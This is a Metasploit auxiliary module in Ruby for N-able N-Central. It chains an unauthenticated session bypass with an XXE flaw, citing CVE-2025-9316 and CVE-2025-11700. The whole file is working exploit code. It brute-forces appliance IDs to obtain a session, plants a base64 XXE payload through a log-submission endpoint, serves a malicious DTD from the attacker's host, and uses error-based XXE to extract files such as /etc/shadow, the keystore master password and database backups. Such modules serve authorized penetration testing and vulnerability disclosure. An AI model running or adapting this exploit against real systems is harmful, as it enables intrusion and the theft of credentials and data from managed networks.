# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'N-able N-Central Authentication Bypass and XXE Scanner',
        'Description' => %q{
          This module scans for vulnerable N-able N-Central instances affected by
          CVE-2025-9316 (Unauthenticated Session Bypass) and CVE-2025-11700 (XXE).

          The module attempts to exploit CVE-2025-9316 by sending a sessionHello SOAP
          request to the ServerMMS endpoint with various appliance IDs to obtain an
          unauthenticated session. If successful, it then tests for CVE-2025-11700
          by writing an XXE payload file and triggering it via importServiceTemplateFromFile.

          Files of interest that can be read via XXE:
          - /opt/nable/var/ncsai/etc/ncbackup.conf
          - /var/opt/n-central/tmp/ncbackup/ncbackup.bin (PostgreSQL dump)
          - /opt/nable/etc/keystore.bcfks (encrypted keystore)
          - /opt/nable/etc/masterPassword (keystore password)

          Affected versions: N-Central < 2025.4.0.9
        },
        'Author' => [
          'Zach Hanley (Horizon3.ai)',                  # Discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-9316'],
          ['CVE', '2025-11700'],
          ['URL', 'https://horizon3.ai/attack-research/attack-blogs/n-able-n-central-from-n-days-to-0-days/']
        ],
        'DisclosureDate' => '2025-11-17',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptIntRange.new('APPLIANCE_ID', [true, 'Appliance ID range to test (e.g., 1-30)', '1-30']),
      OptString.new('LOG_PATH', [true, 'Directory path where the log file is written', '/opt/nable/webapps/ROOT/applianceLog']),
      OptString.new('FILE', [
        true,
        'File to read via XXE (e.g., /etc/passwd, /opt/nable/var/ncsai/etc/ncbackup.conf, ' \
        '/var/opt/n-central/tmp/ncbackup/ncbackup.bin, /opt/nable/etc/masterPassword, /etc/shadow)',
        '/etc/passwd'
      ])
    ])
  end

  def run
    @dtd_filename = "#{Rex::Text.rand_text_alpha(8..15)}.dtd"
    # NOTE: SSL is disabled by default as N-Central (Java) cannot validate self-signed certificates
    # and will fail with: "PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:
    # unable to find valid certification path to requested target". HTTP works fine for XXE exploitation.
    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_request_uri(cli, req)
        end,
        'Path' => '/'
      },
      'ssl' => false
    })

    print_status("Started XXE DTD server on #{srvhost_addr}:#{srvport}")
    super
  end

  def run_host(ip)
    print_status("Scanning #{ip}:#{rport} for N-Central vulnerabilities")

    service = report_service(
      host: ip,
      port: rport,
      proto: 'tcp',
      name: 'http',
      info: 'N-able N-Central'
    )

    # Test for CVE-2025-9316 (Authentication Bypass)
    session_id, appliance_id = test_auth_bypass
    unless session_id && appliance_id
      vprint_status("#{ip}:#{rport} - Not vulnerable to CVE-2025-9316 or requires different appliance ID")
      return
    end

    print_good("#{ip}:#{rport} - Vulnerable to CVE-2025-9316 (Authentication Bypass)")
    print_good("#{ip}:#{rport} - Obtained session ID: #{session_id} (appliance ID: #{appliance_id})")

    report_vuln(
      host: ip,
      port: rport,
      service: service,
      name: 'N-able N-Central Unauthenticated Session Bypass',
      refs: ['CVE-2025-9316'],
      info: "Session ID: #{session_id}, Appliance ID: #{appliance_id}"
    )

    # Test for CVE-2025-11700 (XXE) using the obtained session
    test_xxe(session_id, appliance_id, service)
  end

  def test_auth_bypass
    Msf::OptIntRange.parse(datastore['APPLIANCE_ID']).each do |appliance_id|
      vprint_status("Testing appliance ID: #{appliance_id}")

      soap_body = <<~XML
        <ns1:sessionHello xmlns:ns1="http://www.n-able.com/mickey">
          <applianceId>#{appliance_id}</applianceId>
        </ns1:sessionHello>
      XML

      res = send_soap_request('/dms/services/ServerUI', soap_body)
      next unless res

      session_id = parse_session_id(res.body)
      return [session_id, appliance_id] if res.code == 200 && session_id

      next if expected_error?(res.body)
    end

    [nil, nil]
  end

  def expected_error?(body)
    body_lower = body.to_s.downcase
    [
      'invalid version sent to hello',
      'appliance type does not exist',
      'appliance type id error',
      'invalid appliance version'
    ].any? { |err| body_lower.include?(err) }
  end

  def test_xxe(session_id, appliance_id, service)
    vprint_status("Testing CVE-2025-11700 (XXE) with session ID: #{session_id} (target file: #{datastore['FILE']})")

    @nonexistent_path = Rex::Text.rand_text_alpha(8..15)

    xxe_payload = build_xxe_payload
    encoded_payload = Rex::Text.encode_base64(xxe_payload)

    unless write_xxe_payload(session_id, encoded_payload)
      vprint_error('Failed to write XXE payload file')
      return
    end

    sleep(2)

    payload_file = build_log_file_path(appliance_id)
    res = trigger_xxe(session_id, payload_file)

    unless res
      vprint_status("#{rhost}:#{rport} - No response from server")
      return
    end

    file_content = extract_file_contents(res.body)
    unless file_content
      vprint_status("#{rhost}:#{rport} - XXE triggered but could not extract file contents from response")
      return
    end

    print_good("#{rhost}:#{rport} - XXE file read succeeded (CVE-2025-11700)")
    print_line
    print_line(file_content)
    print_line
    stored_path = store_loot('nable.file', 'text/plain', rhost, file_content, datastore['FILE'], "XXE file read - #{datastore['FILE']}", service)
    print_good("Stored #{datastore['FILE']} to #{stored_path}")
    report_vuln(
      host: rhost,
      port: rport,
      service: service,
      name: 'N-able N-Central XXE Vulnerability',
      refs: ['CVE-2025-11700'],
      info: "XXE triggered via importServiceTemplateFromFile - File: #{datastore['FILE']}"
    )
  end

  def build_xxe_payload
    # NOTE: Using http:// only - SSL is disabled as N-Central (Java) fails with:
    # "PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:
    # unable to find valid certification path to requested target"
    dtd_url = "http://#{srvhost_addr}:#{srvport}/#{@dtd_filename}"
    template_name = Rex::Text.rand_text_alpha(8..15)
    ent_xxe = Rex::Text.rand_text_alpha(4..8)

    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE servicetemplate [
      <!ENTITY % #{ent_xxe} SYSTEM "#{dtd_url}">
      %#{ent_xxe};
      ]>
      <servicetemplate syntaxversion="2.1.0.0">
      <name>#{template_name}</name>
      <data></data>
      </servicetemplate>
    XML
  end

  def build_log_file_path(appliance_id)
    log_dir = datastore['LOG_PATH'] || '/opt/nable/webapps/ROOT/applianceLog'
    "#{log_dir}/network_check_log_#{appliance_id}.log"
  end

  def write_xxe_payload(session_id, encoded_payload)
    soap_body = <<~XML
      <ns1:applianceLogSubmit xmlns:ns1="http://www.n-able.com/mickey">
        <sessionID>#{session_id}</sessionID>
        <logType>NETWORK_CHECK_LOG</logType>
        <contents>#{encoded_payload}</contents>
      </ns1:applianceLogSubmit>
    XML

    res = send_soap_request('/dms/services/ServerMMS', soap_body)
    res&.code == 200
  end

  def trigger_xxe(session_id, file_path)
    soap_body = <<~XML
      <ns1:importServiceTemplateFromFile xmlns:ns1="http://www.n-able.com/mickey">
        <ns1:sessionId>#{session_id}</ns1:sessionId>
        <ns1:customerId>1</ns1:customerId>
        <ns1:filePath>#{file_path}</ns1:filePath>
      </ns1:importServiceTemplateFromFile>
    XML

    send_soap_request('/dms/services/ServerUI', soap_body)
  end

  def send_soap_request(endpoint, soap_body)
    soap_request = <<~XML
      <?xml version="1.0" encoding="utf-8"?>
      <soapenv:Envelope
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <soapenv:Header/>
        <soapenv:Body>
          #{soap_body}
        </soapenv:Body>
      </soapenv:Envelope>
    XML

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, endpoint),
      'method' => 'POST',
      'ctype' => 'text/xml; charset=utf-8',
      'data' => soap_request,
      'headers' => {
        'SOAPAction' => '""'
      }
    })
  end

  def parse_session_id(response_body)
    response_body.downcase.match(%r{<sessionid[^>]*>(\d+)</sessionid>})&.[](1)
  end

  def extract_file_contents(response_text)
    # Extract file contents from SOAP fault detail
    # Pattern: <detail><string>[tid: UUID] /<file_contents> (File name too long)</string>
    # The file content is injected directly into the path, so we capture everything after "] /"
    pattern = %r{<detail><string>\[tid:[^\]]+\]\s*/(.*?)(?:\s*\(File name too long\))?</string>}m

    match = response_text.match(pattern)
    return nil unless match

    content = match[1].strip
    content.empty? ? nil : content
  end

  def on_request_uri(cli, req)
    super

    unless req.uri =~ %r{/#{Regexp.escape(@dtd_filename)}}
      send_response(cli, 'Not Found', 404)
      return
    end

    handle_dtd_request(cli)
  end

  def handle_dtd_request(cli)
    vprint_status("DTD requested from #{cli.peerhost}")
    dtd = make_xxe_dtd
    send_response(cli, dtd, { 'Content-Type' => 'application/xml-dtd' })
  end

  def make_xxe_dtd
    ent_file = Rex::Text.rand_text_alpha(4..8)
    ent_eval = Rex::Text.rand_text_alpha(4..8)

    # Error-based XXE: inject file content into non-existent file path
    # The FileNotFoundException error message will contain the file contents
    <<~DTD
      <!ENTITY % #{ent_file} SYSTEM "file://#{datastore['FILE']}">
      <!ENTITY % #{ent_eval} "<!ENTITY &#x25; error SYSTEM 'file:///#{@nonexistent_path}/%#{ent_file};'>">
      %#{ent_eval};
      %error;
    DTD
  end

end
